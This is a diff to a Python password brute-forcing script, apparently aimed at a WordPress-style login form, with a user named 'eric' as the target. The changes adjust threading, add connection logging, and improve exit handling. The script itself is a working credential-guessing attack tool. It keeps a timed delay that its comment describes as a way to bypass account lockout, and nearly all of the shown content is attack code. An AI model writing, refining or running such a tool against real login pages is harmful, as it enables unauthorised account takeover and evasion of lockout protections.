@@ -43,14 +43,20 @@ class Bruter:
         self.found = False
         self.stop_event = threading.Event()
         self.threads = []
+        self._print_lock = threading.Lock()
+        self._connection_logged = False
         print(f'\nBrute forcing {url}.\n')
         print("Finished setup.\nTarget: %s\nUsername : %s\nWordlist: %s\n" % (TARGET, username, WORDLIST))
-        if input("Continue? [y/N] ").lower()[0] != 'y':
-            print("Exiting.")
+        try:
+            if input("Continue? [y/N] ").lower() not in ('y', 'yes'):
+                print("Exiting.")
+                sys.exit(0)
+        except KeyboardInterrupt:
+            print("\nExiting.")
             sys.exit(0)
 
     def run_bruteforce(self, passwords):
-        for _ in range(100):
+        for _ in range(5):
             t = threading.Thread(target=self.web_bruter, args=(passwords,))
             t.daemon = True
             self.threads.append(t)
@@ -60,8 +66,10 @@ class Bruter:
                 t.join()
         except KeyboardInterrupt:
             print('\n[!] Stopping threads...')
-            self.stop_event.set()
-            sys.exit(1)
+            # self.stop_event.set()
+            return
+        if not self._connection_logged:
+            print(f"\n[!] Could not reach {self.url}. Ensure the target is up and try again.")
     
     def web_bruter(self, passwords):
         # initialze session object to maintain cookies across requests
@@ -69,14 +77,21 @@ class Bruter:
         try:
             resp0 = session.get(self.url)
         except requests.RequestException as e:
-            print(f"Error connecting to {self.url}: {e}")
             return
+        with self._print_lock:
+            if not self._connection_logged:
+                print(f"[+] Connection established to {self.url}")
+                self._connection_logged = True
+
+            
         params = get_params(resp0.content)
         params['log'] = self.username
 
         while not self.stop_event.is_set():
             # attempt lockout bypass by sleeping; wait() returns immediately if stop_event is set
             self.stop_event.wait(5)
+            if self.stop_event.is_set():
+                return
             try:
                 passwd = passwords.get_nowait()
             except Empty:
@@ -106,4 +121,4 @@ if __name__ == '__main__':
     b = Bruter('eric', TARGET)
     b.run_bruteforce(words)
     if not b.found:
-        print('\nExhausted wordlist or encountered an error; password not found.')
+        print('\nExhausted wordlist or encountered an exception; password not found.')
